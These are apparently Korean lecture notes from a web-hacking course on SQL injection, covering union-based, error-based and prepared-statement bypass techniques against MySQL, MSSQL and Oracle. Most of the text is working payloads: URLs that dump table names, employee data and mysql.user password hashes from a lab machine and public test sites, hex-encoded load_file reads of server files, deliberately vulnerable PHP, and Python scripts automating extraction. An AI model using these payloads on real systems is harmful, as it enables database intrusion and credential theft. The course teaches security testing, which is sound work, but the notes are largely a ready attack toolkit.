SQL Injection 수업

강의코스

소스코드 기반 웹 해킹

웹해킹 서버 침투 기법

SQL 인젝션 자동화 기법

리버스 엔지니어링

모바일 취약점 분석

-----------------------------------------------------------------------------------------
교육과정 소개

sql injection 취약점 이란?


이만 알고 있을 경우
select * FROM member where name like '%이%';

전체삭제
delete from member where idx=1 or 1=1; 이건 전체가 삭제됨

idx=5 or 1=1 공백이 지워지고 다 붙을 때 
     5 /**/ or /**/ 1=1공백인정

ex) select * from user where user='root'/**/or/**/1=1;
select * from user where user='root'/**/or---1=1;

select concat('a','b','c','d') -> 하나로 붙여줌

------------------------------------------------------------------------------------
UNION BASED SQL INJECTION

http://192.168.171.138/empinfo_name.php?empname=%bf%27and+1=2+union+select+EmployeeID,2,FirstName,Title,5,6,HireDate,8,9,10,11,12,13,14,15,16,17,18,19+from+Employees%23

systemctl start oracle-xe (오라클 키는법)

wget https://raw.githubusercontent.com/n3osim/sql/master/examples/chap3/empinfo_id.jsp

ALL_TAB_COLUMNS
DBA_TAB_COLUMNS
USER_TAB_COLUMNS

OWNER VARCHAR2(30)
TABLE_NAME VARCHAR2(30)
COLUMN_NAME VARCHAR2(30)
DATA_TYPE VARCHAR2(106)

OWNER
OBJECT_NAME
OJECT_ID

select * from tabs;
select TABLE_NAME from tabs;
select TABLE_NAME from cols;
select TABLE_NAME from user_tables;
select column_name from cols where table_name='EMPLOYEES'
select tname from tab
select cname from col where tname='EMPLOYEES'

union select null.... from dual 
1 or '1' -> 숫자형인지 문자형인지 판단

http://192.168.171.138:8080/empinfo_id.jsp?empid=101+union+select+1,'2',null,null,null,current_date,'7',null,null,null,null+from+dual--

http://192.168.171.138:8080/empinfo_id.jsp?empid=101+union+select+1,tname,null,null,null,current_date,'7',null,null,null,null+from+tab--

http://192.168.171.138:8080/empinfo_id.jsp?empid=0+union+select+1,tname,null,null,null,current_date,cname,2,2,2,2+from+col+where+tname='EMPLOYEES'--

http://192.168.171.138:8080/empinfo_id.jsp?empid=0+union+select+EMPLOYEE_ID,EMAIL,null,null,null,current_date,to_char(SALARY),2,2,2,2+from+EMPLOYEES--

http://192.168.171.138:8080/empinfo_id.jsp?empid=0+union+select+EMPLOYEE_ID,EMAIL,null,null,null,current_date,to_char(SALARY,'$999,999'),2,2,2,2+from+EMPLOYEES--

null+union+select+EMPLOYEE_ID,EMAIL,null,null,null,current_date,to_char(SSLARY,%27$999,999$27),null,null,null,null+from+EMPLOYEES--

wget https://raw.githubusercontent.com/n3oism/sql/master/examples/chap3/empinfo_date.jsp


http://192.168.171.138:8080/empinfo_date.jsp?date=2003-06-17')+order+by+11--

http://192.168.171.138:8080/empinfo_date.jsp?date=2003-06-17')+and+1=2+union+select+null,null,null,null,null,null,null,null,null,null,null+from+dual--

mysql injection 치트시트
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

http://192.168.171.138/empinfo_id.php?empid=1+union+select+schema_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+from+information_schema.schemata

http://192.168.171.138/empinfo_id.php?empid=0+union+select+1,host,user,password,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+from+mysql.user

http://192.168.171.138/empinfo_id.php?empid=0+union+select+host,2,user,password,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+from+mysql.user

grant all privileges on northwind.* to northwind@localhost.* to northwind@localhost  identified by 'northwind';



<?php

​

$conn = new mysqli('localhost', 'root', 'root', 'northwind'); 

​

if($conn->connect_error) {

   die("Connection failed: " . $conn->connect_error);

}

​

$_empid = $_GET['empid'];

$stmt = $conn->prepare("SELECT EmployeeID, FirstName, Title, HireDate FROM Employees WHERE EmployeeID=?");

$stmt->bind_param("i",$_empid);

$stmt->execute();

$stmt->bind_result($empid, $fname, $title, $hdate);

​

print "<table border=1 cellpadding=5 cellspacing=0>\n";

print "\t<tr>\n\t\t<td>Employee ID</td><td>First Name</td><td>Title</td><td>Hire Date</td>\n\t</tr>";

​

while ($stmt->fetch()) {

    print "\t<tr>\n\t\t<td>" . $empid . "</td><td>" . $fname . "</td><td>" . $title . "</td><td>" . $hdate . "</td>\n\t</tr>\n";

}

print "</table>\n";

​

$conn->close();

?>

http://192.168.171.138/empinfo_id2.php?empname=Nancy

-----------------------
CREATE PROCEDURE EMPNAME(emp_name VARCHAR(50))

BEGIN

   SELECT * FROM Employees        WHERE FirstName like concat('%',emp_name,'%') limit 10;

END


<?php

​

$conn = new mysqli('localhost', 'root', 'root', 'northwind'); 

​

if($conn->connect_error) {

   die("Connection failed: " . $conn->connect_error);

}

​

$_empname = $_GET['empname'];

$stmt = $conn->query("CALL EMPNAME('$_empname')");

​

print "<table border=1 cellpadding=5 cellspacing=0>\n";

print "\t<tr>\n\t\t<td>Employee ID</td><td>First Name</td><td>Title</td><td>Hire Date</td>\n\t</tr>";

​

while ($row = $stmt->fetch_object()) {

    print "\t<tr>\n\t\t<td>" . $row->EmployeeID . "</td><td>" . $row->FirstName . "</td><td>" . $row->Title . "</td><td>" . $row->HireDate . "</td>\n\t</tr>\n";

}

print "</table>\n";

​

$conn->close();

?>

empinfo_name.php?empname=Nancy%27XOR(sleep(10)XOR%27

-------------------------------------------
item=defualt.asp

컨트롤 +U 소스 분석

http://testasp.vulnweb.com/showforum.asp?id=0'

http://testasp.vulnweb.com/showforum.asp?id=0+and+1=1--

showforum.asp 확인

http://testasp.vulnweb.com/Search.asp?tfSearch='))>0--

http://testasp.vulnweb.com/Search.asp?tfSearch='))>0+order+by+10--

http://php.testsparker.com/artist.php?id=1%20or%201=1%27

http://php.testsparker.com/artist.php?id=1+or+1=1%27

http://php.testsparker.com/artist.php?id=1+or+1=1))+order+by+1--

http://php.testsparker.com/artist.php?id=1+or+1=2))+union+select+1,2,3,4,5--

http://php.testsparker.com/artist.php?id=1+or+1=2))+union+select+1,table_name,3,4,5+from+information_schema.tables+where+table_type="base+table"--

http://php.testsparker.com/artist.php?id=1))+or+1=1+order+by+5%23

http://php.testsparker.com/artist.php?id=1))+or+1=2+union+select+1,table_name,3,4,5+from+information_schema.tables%23

http://php.testsparker.com/artist.php?id=1+or+1=2))+union+select+1,column_name,3,4,5+from+information_schema.columns+where+table_name=%22user%22--

http://php.testsparker.com/artist.php?id=1+or+1=2))+union+select+1,table_name,table_schema,4,5+from+information_schema.tables+where+table_type=%22base+table%22--

http://php.testsparker.com/artist.php?id=1))+or+1=2+union+select+1,column_name,3,4,5+from+information_schema.columns+where+table_name=table_name%23

http://php.testsparker.com/artist.php?id=1))+or+1=2+union+select+1,column_name,3,4,5+from+information_schema.columns+where+1=1%23

http://php.testsparker.com/artist.php?id=1+or+1=2))+union+select+1,host,user,Password,5+from+mysql.user--

//////////////////////////////////////////?????????????????????????????????????????
http://php.testsparker.com/artist.php?id=1))+or+1=2+union+select+1,column_name,3,4,5+from+information_schema.columns+/*table_name*/%23
????????????????????????????????????????????????????????

'무자열'
"객체명"

http://php.testsparker.com/artist.php?id=1))+or+1=2+union+select+1,host,user,password,5+from+mysql.user%23

mysql load_file

http://php.testsparker.com/artist.php?id=1))+or+1=2+union+select+1,load_file(0x433A5C417070536572765C7777775C68656C6C6F2E706870),3,4,5%23


https://www.python.org/download/releases/2.7/

select @@VERSION

select 1 where 1=(select top 1 name,xtype from sysobjects where xtype='U')

select id, name from sysobjects where xtype=0x55
select name,xtype from syscolumns where id=1205579333

select top 1 table_name from information_schema.tables

select top 1 table_name from information_schema.tables where table_name not in ('CustomerDemographics','Region')

select top 1 table_name from()T order by 1 desc

select top 1 table_name from(select top 3 table_name from INFORMATION_SCHEMA.tables order by 1 asc)T order by 1 desc

sub  main  sub  main  sub  main   sub   main

A      A      A     B      A     C      A      D

C              B     A      B     B       B      C

B              C             C     A      C      B

D              D            D             D      A

select top 1 table_name from(select top 1 table_name from information_schema.tables order by 1)a order by 1 desc

-------------------------------------------------------------
가장 먼저 UNION 기반 SQL 인젝션에 적합한 페이지를 찾고, 사이트 이용자의 아이디와 패스워드를 조회해 보세요.

첫번째, 예제

실습 순서

1. UNION 기반SQLi 적합한 페이지 확인
2. 인용구를 주입해서 SQL에 취약한지 확인
3. 칼럼의 개수 확인
4. 테이블명 확인
5. 칼럼명 확인
6. 이용자의 id, pwd 조회

두번째 예제는 취약한 포인트를 식별하고 UNION 기반 SQL인젝션이 가능한지 확인해 보시기 바랍니다.

실습 순서

1. UNION 기반 SQLi 적합한 페이지 확인
2. 인용구를 주입해서 SQLi에 취약한지 확인
3. UNION 기반 SQLi 불가함을 확인
4. File Download 취약점을 이용하여 소스코드 확인
5. 소스코드 분석을 통해서 SQLi공격코드 작성
6. 칼럼의 개수 확인
7. 테이블명 확인
8. 칼럼명 확인
9. 이용자 id,pwd 조회

item=다운로드 파일명
주입하면 다운로드가 가능합니다.

자기가 찾은 포인트가 UNION 기반 SQLi 에 적합한지 소스코드를 통해서 확인하세요.

소스코드의 쿼리문을 분석해서 맨 끝지점에 공격 구문 주입이 가능하도록 쿼리문을 구성해야 합니다.

네번째 실습예제입니다.

먼저 SQL에 취약한 포인트를 찾아 보기 바랍니다.

실습순서

1. UNION 기반 SQLi 적합한 페이지 확인->페이지 자체가 많지 않음
2. 인용구를 주입해서 SQLi에 취약한지 확인
3. 현재까지 학습한 방법으로는 취약한 포인트 식별 불가
4. 첫 화면의 검색 기능 GO의 파라미터 타입을 예측해서 전체 게시물 나열
5. 쿼리 주입이 가능하도록 공격구문 구성
6. 칼럼의 개수 확인
7. 테이블명 확인이 불가함
8. 필터링이 되어 있으며, 필터링된 키워드를 식별
9. 칼럼명 확인
10. 데이터 조회

id 파라미터의 데이터 타입을 고민해 보시고 SQL 인젝션 공격이 가능한 포인트인지 분석하기 위해서 전체게시물이 나열되도록 or 1=1 and 1=1 'o"=' 'and"=' 등 명제가 참이 되도록 만들어 보세요

화면과 같이 information_schema.tables에서 table_schema.table_name이 나열되게 union 구문을 구성해 보세요

테이블명 조회 후 칼럼명을 가져오려고 하는데 WHERE 사용하면 해당 테이블의 칼럼 조회가 불가합니다. 왜이러한지 원인을 찾아보세요.

서버에서 인용구를 필터링하고 있습니다. 인용구를 사용하지 않고 TABLE_NAME 주입 방법을 인터넷에서 검색해 보시기 바랍니다.

mysql 데이터베이스의 user를 조회하기 바랍니다. 힌트 현재 연결된 데이터 베이스명이 무엇인지 찾아보시기 바랍니다.

해당 DB는 root 계정으로 연도오디어 있으며 load_file 펑션을 사용할 수 있습니다. 웹 루트의 위치를 찾고 php 소스코드를 열람해 보시기 바랍니다.

힌트1. 사이트 페이지 중에 기능 오류로 절대경로 정보가 노출됩니다. 해당정보를 이용하여 웹 루트의 위치를 확인할 수 있습니다.

힌트2 인용구 필터링이 적용되어 있습니다. load_file은 문자열로 경로 정보를 주입해야 합니다. HEX값으로 치환해서 주입해 보시기 바랍니다.

433a5c417070536572765c7777775c68656c6c6f2e706870

Error-Based SQLi systemctl start mssql-server

select sc.name,sc.type from sysobjects sb, syscolumns sc where sb.id=sc.id and sb.xtype=char(85) and sb.name='Employees'

select table_name from(select ROW_NUMBER() over(order by table_name) as rowid,table_name from INFORMATION_SCHEMA.TABLES)T where rowid=7
---------------------------------------------------------------------------------
2019-08-31

select top 1 table_name from information_schema.tables where table_name not in ('users','CustomerDemographics','Region')

select top 1 table_name from(select top 2 table_name from INFORMATION_SCHEMA.tables order by 1 asc)T order by 1 desc

select row_number() over(order by table_name) as rowid, table_name from information_schema.tables 
where 1=1-> 에러발생 안함

select row_number() over(order by table_name) as rowid, table_name from information_schema.tables 
where 1=1 and rowid=1 -> 에러발생

에러발생 이유? where은 순번이 있어야 가능

select table_name FROM
(select row_number() over(order by table_name) as rowid, table_name from information_schema.tables)t 
where rowid=2
==> 조회가능
t-> 별칭을 붙여줌(아무거나 붙여도 상관없음)

cd / var/www/html 밑
wget https://raw.githubusercontent.com/n3oism/sql/master/examples/chap6/mssql_id.php
P 239 다운

http://192.168.171.138/mssql_id.php?empid=2 접속후 '입력

http://192.168.171.138/mssql_id.php?empid=2+and+1=1

http://192.168.171.138/mssql_id.php?empid=2+and+1=@@version--

http://192.168.171.138/mssql_id.php?empid=2/@@version--

http://192.168.171.138/mssql_id.php?empid=@@version--

http://192.168.171.138/mssql_id.php?empid=1+and+1=(@@version)--

select table_name FROM
(select row_number() over(order by table_name) as rowid, table_name from information_schema.tables where table_type='base table')t 
where rowid=5

select table_name FROM
(select row_number() over(order by table_name) as rowid, table_name from information_schema.tables where table_type='base table')t 
where rowid=5

http://192.168.171.138/mssql_id.php?empid=(select+column_name+FROM(select+row_number()+over(order+by+column_name)+as+rowid,+column_name+from+information_schema.columns+where+table_name='Employees')T+where+rowid=3)--

select firstname, hiredate, title from Employees

select top 1 firstname+','+cast(hiredate as varchar)+',' title from Employees

select firstname,hiredate,title FROM
(select row_number() over(order by EmployeeID) as rowid, firstname,hiredate,title from Employees)T
where rowid=1

select firstname+','+cast(hiredate as varchar)+','title FROM
(select row_number() over(order by EmployeeID) as rowid, firstname,hiredate,title from Employees)T
where rowid=2

switchysharp 크롬 프록시 설정 플로그인이름

http://192.168.171.138/mssql_id.php?empid=(select+firstname%2b','%2bcast(hiredate+as+varchar)%2b','title+FROM(select+row_number()+over(order+by+EmployeeID)+as+rowid,+firstname,hiredate,title+from+Employees)T+where+rowid=3)--

wget https://raw.githubusercontent.com/n3oism/sql/master/examples/chap6/mysql_sort.php
여기로 다운

http://192.168.171.138/mysql_sort.php?sort=CategorySales 접속

select count(*),concat(version(),floor(rand(0)*2))a from information_schema.tables group by a

select concat(version(),floor(rand(0)*2))a from information_schema.tables 

select rand(0) from information_schema.tables

select floor(rand(0)*2) from information_schema.tables

select count(*),concat(version(),floor(rand(1)*2))a from information_schema.tables group by a

select count(*),concat('1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890',floor(rand(0)*2))a from information_schema.tables group by a

Duplicate entry '1234567890123456789012345678901234567890123456789012345678901234' for key 'group_key'
Error code: 1062
SQL state: 23000

총 64자 발생

MySQL 더블쿼리 에러 유발 구문

select 1 from(select count(*),concat((select concat_ws(','FirstName,HireDate,Salary) from Employees limit 0,1),floor(rand()*2))a from information_schema.tables group by a)t

select table_name from information_schema.tables where table_type='base table' limit 1

select table_name from information_schema.tables where table_type='base table' limit 2,1

select count(*),concat((select table_name from information_schema.tables where table_type='base table' limit 2,1),floor(rand(0)*2))a from information_schema.tables group by a

select count(*),concat((select column_name from information_schema.columns where table_name='Employees' limit 1,1),floor(rand(0)*2))a from information_schema.tables group by a

select count(*),concat((select concat_WS(',',FirstName, HireDate, Salary) from Employees limit 1,1),floor(rand(0)*2))a from information_schema.tables group by a

http://192.168.171.138/mysql_sort.php?sort=(select+count(*),concat((select+concat_WS(',',FirstName,+HireDate,+Salary)+from+Employees+limit+1,1),floor(rand(0)*2))a+from+information_schema.tables+group+by+a)

http://192.168.171.138/mysql_sort.php?sort=(select+1+from(select+count(*),concat((select+concat_WS(',',FirstName,+HireDate,+Salary)+from+Employees+limit+0,1),floor(rand(0)*2))a+from+information_schema.tables+group+by+a)t)#

http://192.168.171.138/mysql_sort.php?sort=(select+1+from(select+count(*),concat((select+concat_WS(0x2c,FirstName,+HireDate,+Salary)+from+Employees+limit+0,1),floor(rand(0)*2))a+from+information_schema.tables+group+by+a)t)#

http://testphp.vulnweb.com/listproducts.php?cat=1+and+1=(select+1)

http://testphp.vulnweb.com/listproducts.php?cat=1+and+1=(select+0)

http://testphp.vulnweb.com/listproducts.php?cat=(select+1+from(select+count(*),concat((select+concat_ws(0x2,uname,pass)+from+users+limit+0,1),floor(rand(0)*2))a+from+information_schema.tables+group+by+a)T)

select extractvalue(1,concat(0x2e,@@version)) from dual

select extractvalue(1,concat(0x2e,(select table_name from information_schema.tables limit 1,1))) from dual

extractvalue(1,concat(0x2e,@@version))

http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(1,concat(0x2e,@@version))

http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(1,concat(0x2e,(select%20table_name%20from%20information_schema.tables%20limit%201,1)))

SET @xml = '
<items>
	<dbms>
			<value type="0">SQL Server 2005</value>
			<value type="1">MySQL 5.5</value>
			<value type="2">oracle 11g Express</value>
		</dbms>
</items>';

Select ExtractValue(@xml, 'items/dbms/value') value;

Select ExtractValue(@xml, '/items/../items/dbms/value') value;

Select ExtractValue(@xml, '/.') value;

Select ExtractValue(@xml, '.ABC') value;

XPATH syntax error: 'ABC'
Error code: 1105
SQL state: HY000

Select ExtractValue(@xml, concat('.','test')) value;

Select ExtractValue(@xml,concat(',',@@version)) value;

http://testphp.vulnweb.com/listproducts.php?cat=Updatexml(1,concat(0x2e,@@version),1)

Select ExtractValue(1,concat(',',@@version)) value;
Select UpdateXML(1,concat(',',@@version),1) value;

wget https://raw.githubusercontent.com/n3oism/sql/master/examples/chap6/empinfo_sort.jsp
다운

http://192.168.171.138:8080/empinfo_sort.jsp?sort=1

select to_char(dbms_xmlgen.getxml('select "' || substr((select banner from v$version where rownum=1),1,30) || '"from sys.dual')) from dual

select "Oracle Database 11g Express Ed" from sys.dual

select "test" from sys.dual

select rawtohex(XMLType((select '<start_'|| rawtohex(banner) || '_end:root>'from v$version where rownum=1)))from dual

select rawtohex(XMLType((select '<start_'|| (banner) || '_end:root>'from v$version where rownum=1)))from dual

select rawtohex(XMLType((select '<start_'|| rawtohex((select tname from tab where rownum=1)) || '_end:root>'from v$version where rownum=1)))from dual

select extractvalue(XMLTYPE('<a></a>'),chr(46)||(select banner from v$version where rownum=1))from dual

Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

select extractvalue(XMLTYPE('<a></a>'),chr(46)||(select tname from tab where rownum=1))from dual

select extractvalue(XMLTYPE('<a></a>'),chr(46)||(select tname from tab where rownum=2))from dual

select table_name from tabs

select rownum as rowidx, table_name from tabs

select * from(select rownum as rowidx, table_name from tabs)T where rowidx=1

select table_name from(select rownum as rowidx, table_name from tabs)T where rowidx=1

select extractvalue(XMLTYPE('<a></a>'),chr(46)||(select table_name from(select rownum as rowidx, table_name from tabs)T where rowidx=1))from dual

http://192.168.171.138:8080/empinfo_sort.jsp?sort=extractvalue(XMLTYPE('%3Ca%3E%3C/a%3E'),chr(46)%7c%7c(select+table_name+from(select+rownum+as+rowidx,+table_name+from+tabs)T+where+rowidx=2))

'=%27

select column_name from(select  rownum as rowidx, column_name from cols where table_name='EMPLOYEES')T where rowidx=1
칼럼명 가져오는 쿼리

select FIRST_NAME||','||PHONE_NUMBER||','||EMAIL from(select rownum as rowidx, FIRST_NAME,PHONE_NUMBER,EMAIL from EMPLOYEES)T where rowidx=1

오라클데이터 가져오는 예시

오라클 예제에 테이블명, 칼럼명, 데이터 획득을 실습해 보시기 바랍니다.

--------------------------------------------------------

Prepard SQLi 예시입니다. 실습 예제를 다운로드 하시고 Oracle DB를 구동하셔야 합니다.

systemctl start oracle-xe
cd /usr/share/tomcat/webapps/ROOT/
wget https://raw.githubusercontent.com/n3oism/sql/master/examples/chap6/dbcon_prepared.jsp
wget https://raw.githubusercontent.com/n3oism/sql/master/examples/chap6/empinfo_tab_prepared.jsp

먼저 각자 자기가 아는 범위에서 풀어보시기 바랍니다.

:8080/empinfo_tab_prepared.jsp?tname=EMPLOYEES&empid=100

본인의 가상 머신 IP에 위의 URL 주소로 접속하면 예제에 접속이 가능합니다.

http://192.168.2.17:8080/empinfo_tab_prepared.jsp?tname=EMPLOYEES&empid=100

현재까지 여러분이 학습한 내용으로 SQL 인젝션이 불가한 원인이 무엇인지 유추해 보시기 바랍니다.

tname, empid 파라미터가 있습니다. SQL 인젝션이 되는 파라미터는 무엇이며, 안되는 파라미터는 이유가 무엇인지 찾아 보시기 바랍니다.

tname, empid 파라미터에 인용구를 추가하면 서로 상이한 에러 구문이 노출됩니다. 해당 에러 구문의 의미가 무엇인지 먼저 확인하세요.

java.lang.NumberFormatException: For input string: "100'"
int _empid = Integer.parseInt(request.getParameter("empid"));
==> 숫자로 변환하게 되면 문자를 넣을 수가 없다.
empid는 숫자형으로 SQL 쿼리 주입이 불가하기 때문에 인젝션 또한 불가합니다.


http://192.168.171.138:8080/empinfo_tab_prepared.jsp?tname=EMPLOYEES%27&empid=100

tname은 SQL 인젝션이 가능하지만 부적합한 열 인덱스가 무엇인지 알아야만 SQL 공격이 가능하게 됩니다.

http://egloos.zum.com/byulbada/v/2283975
여기에 힌트가 있습니다
이렇게 모르는 경우는 구글을 검색해서 찾아가야 합니다. 무슨 원인이 에러인지

http://192.168.171.138:8080/empinfo_tab_prepared.jsp?tname=EMPLOYEES+EM,USERS+US&empid=100

http://192.168.171.138:8080/empinfo_tab_prepared.jsp?tname=EMPLOYEES+WHERE+1=1--&empid=100

http://192.168.171.138:8080/empinfo_tab_prepared.jsp?tname=EMPLOYEES+WHERE+101=?--&empid=100

select from EMPLOYEES WHERE 101=?--&empid=100 where employee_id=?

select from EMPLOYEES WHERE 101=?--where employee_id=?

이렇게 된다고 봐야합니다.

http://192.168.171.138:8080/empinfo_tab_prepared.jsp?tname=EMPLOYEES+WHERE+100=?+order+by+1--&empid=100

http://192.168.171.138:8080/empinfo_tab_prepared.jsp?tname=EMPLOYEES+WHERE+100=?+order+by+11--&empid=100

http://192.168.171.138:8080/empinfo_tab_prepared.jsp?tname=EMPLOYEES+WHERE+101=?+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+FROM+DUAL--&empid=100

http://192.168.171.138:8080/empinfo_tab_prepared.jsp?tname=EMPLOYEES+WHERE+101=?+UNION+SELECT+NULL,TNAME,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+FROM+TAB--&empid=100
c:\python2.7\test.py 로 저장하시기 바랍니다.

실행은 python test.py 입니다.

노트패드 쓸거면 노트패드 쭉 쓰고, idle 쓸거면 idle 쭉 써야됩니다. 인텐트 에러 날 수 잇어요ㅠ

두번째 파이썬은 들여쓰기가 매우 중요합니다.

for i in range(1,11):
	print(i)

cd /var/www/html
rm -ef empinfo_id.php
wget https://raw.githubusercontent.com/n3oism/sql/master/examples/chap3/empinfo_id.php

#-*-  coding: utf-8 -*-
import httplib
import urllib

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

domain = "192.168.171.138" #가상 머신의 IP 주소
url = "/empinfo_id.php" #취약한 URL 주소
params = "empid=1"

conn = httplib.HTTPConnection(domain,"80")
#conn = httplib.HTTPSConnection(domain,"443")
conn.request("GET",url + "?" + params,None,headers)
#conn.request("POST",url,params,headers)
response = conn.getresponse().read()
print response


params = "empid=(select+x+from(select+count(*),concat(version(),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"

delims를 추가해서 오류구문의 데이터만 추출해 보도록 하겠습니다.

delims = "!~!~!"
domain = "192.168.2.17" #가상 머신의 IP주소
url = "/empinfo_id.php" #취약한 URL 주소
params = "empid=(select+x+from(select+count(*),concat('" + delims + "',version(),'" + delims +"',floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"
delims 추가한 예시입니다. 보시고 결과에 delims가 추가되어 출력되는지 확인해 보세요

print response.split(delims)[1]

테이블명 가져오는 구문 작성토록 하겠습니다.

cnt = 54
for i in range(0,cnt):
	delims = "!~!~!"
	domain = "192.168.2.17" #가상 머신의 IP주소
	url = "/empinfo_id.php" #취약한 URL 주소
	tname = "(select+table_name+from+information_schema.tables+where+table_type='base+table'+limit+" + str(i) + ",1)"
	params = "empid=(select+x+from(select+count(*),concat('" + delims + "',"+tname+",'" + delims +"',floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"

#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

delims = "!~!~!"

domain = "192.168.2.17" #가상 머신의 IP주소
url = "/empinfo_id.php" #취약한 URL 주소
rcount = "(select+count(*)+from+information_schema.tables+where+table_type='base+table')"
params = "empid=(select+x+from(select+count(*),concat('" + delims + "'," + rcount + ",'" + delims +"',floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"

conn = httplib.HTTPConnection(domain,"80")
#conn = httplib.HTTPSConnection(domain,"443")
conn.request("GET",url + "?" + params,None,headers)
#conn.request("POST",url,params,headers)
response = conn.getresponse().read()
cnt = int(response.split(delims)[1])

for i in range(0,cnt):
   domain = "192.168.2.17" #가상 머신의 IP주소
   url = "/empinfo_id.php" #취약한 URL 주소
   tname = "(select+table_name+from+information_schema.tables+where+table_type='base+table'+limit+" + str(i) + ",1)"
   params = "empid=(select+x+from(select+count(*),concat('" + delims + "'," + tname + ",'" + delims +"',floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"


   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   print response.split(delims)[1]

파이썬 idle에서 시프트 탭 안되시는 분들은https://printhelloworld.tistory.com/m/146
이거 참고해주세요

#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def httpreq(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   delims = "!~!~!"
   domain = "192.168.2.17" #가상 머신의 IP주소
   url = "/empinfo_id.php" #취약한 URL 주소
   params = "empid=(select+x+from(select+count(*),concat('" + delims + "'," + query + ",'" + delims +"',floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   return response.split(delims)[1]

rcount = "(select+count(*)+from+information_schema.tables+where+table_type='base+table')"
cnt = int(httpreq(rcount))
   
for i in range(0,cnt):
   tname = "(select+table_name+from+information_schema.tables+where+table_type='base+table'+limit+" + str(i) + ",1)"
   print httpreq(tname)

http 요청문이 중복되기 때문에 httpreq 함수를 만들어서 소스코드를 간결하게 수정했습니다

#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def httpreq(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   delims = "!~!~!"
   domain = "192.168.2.17" #가상 머신의 IP주소
   url = "/empinfo_id.php" #취약한 URL 주소
   params = "empid=(select+x+from(select+count(*),concat('" + delims + "'," + query + ",'" + delims +"',floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   return response.split(delims)[1]

rcount = "(select+count(*)+from+information_schema.tables+where+table_type='base+table')"
cnt = int(httpreq(rcount))
print "count : " + str(cnt)
   
for i in range(0,cnt):
   tname = "(select+table_name+from+information_schema.tables+where+table_type='base+table'+limit+" + str(i) + ",1)"
   print str(i + 1) + " : " +httpreq(tname)

print("%2d: " % i + httpreq(tname))

이것도 됩니다

print("%-2d: " % i + httpreq(tname))

#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def httpreq(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   delims = "!~!~!"
   domain = "192.168.2.17" #가상 머신의 IP주소
   url = "/empinfo_id.php" #취약한 URL 주소
   params = "empid=(select+x+from(select+count(*),concat('" + delims + "'," + query + ",'" + delims +"',floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   return response.split(delims)[1]

rcount = "(select+count(*)+from+information_schema.tables+where+table_type='base+table')"
cnt = int(httpreq(rcount))
print "count : " + str(cnt)

for i in range(0,cnt):
   tname = "(select+table_name+from+information_schema.tables+where+table_type='base+table'+limit+" + str(i) + ",1)"
   print "{0:>3}".format(str(i + 1)) + " : " + httpreq(tname)


숫자 출력 부분을 추가했습니다.

#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def httpreq(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   delims = "!~!~!"
   domain = "192.168.2.17" #가상 머신의 IP주소
   url = "/empinfo_id.php" #취약한 URL 주소
   params = "empid=(select+x+from(select+count(*),concat('" + delims + "'," + query + ",'" + delims +"',floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"

   conn = httplib.HTTPConnection(domain,"80")
